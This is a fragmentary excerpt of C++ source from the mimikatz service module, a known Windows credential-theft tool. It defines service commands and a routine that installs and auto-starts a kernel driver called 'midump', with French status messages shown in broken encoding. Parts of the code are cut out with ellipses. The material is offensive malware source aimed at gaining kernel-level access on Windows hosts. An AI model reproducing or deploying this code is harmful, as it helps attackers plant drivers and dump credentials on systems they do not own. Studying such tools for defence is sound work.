...
vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzCommands()
{
	...
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(list,		L"list",		L"meh"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"meh"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"meh"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"meh"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(midump,	L"midump",	L"meh"));
	return monVector;
}

bool mod_mimikatz_service::start(vector<wstring> * arguments)
{
	(*outputStream) << L"D�marrage de \'";
	return genericFunction(mod_service::start, arguments);
}

bool mod_mimikatz_service::stop(vector<wstring> * arguments)
{
	(*outputStream) << L"Arr�t de \'";
...
bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
{
	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
	{
		...
		if(!(monService = OpenService(monManager, L"midump", SERVICE_START)))
		{
			if(GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
			{
				(*outputStream) << L"[*] Pilote midump non pr�sent, installation." << endl;
				...
				if(mod_system::getAbsolutePathOf(monPilote, &monPiloteComplet))
				{
					...
					{
						if(monService = CreateService(monManager, L"midump", L"midump driver", READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, monPiloteComplet.c_str(), NULL, NULL, NULL, NULL, NULL))
						{
							(*outputStream) << L"[+] Cr�ation du pilote : OK" << endl;
						...
						else (*outputStream) << L"[!] Impossible de cr�er le pilote ; " << mod_system::getWinError() << endl;
					}
			...
			else (*outputStream) << L"[!] Ouverture du pilote midump : KO ; " << mod_system::getWinError() << endl;
		}
		else (*outputStream) << L"[*] Pilote midump d�j� pr�sent" << endl;
		
		if(monService)
		{
			if(StartService(monService, 0, NULL) != 0)
				(*outputStream) << L"[+] D�marrage du pilote : OK";
			else
				(*outputStream) << L"[-] D�marrage du pilote : KO ; " << mod_system::getWinError();
			(*outputStream) << endl;
	...
	else (*outputStream) << L"[!] Impossible d\'ouvrir le gestionnaire de service pour cr�ation ; " << mod_system::getWinError() << endl;
	return true;
}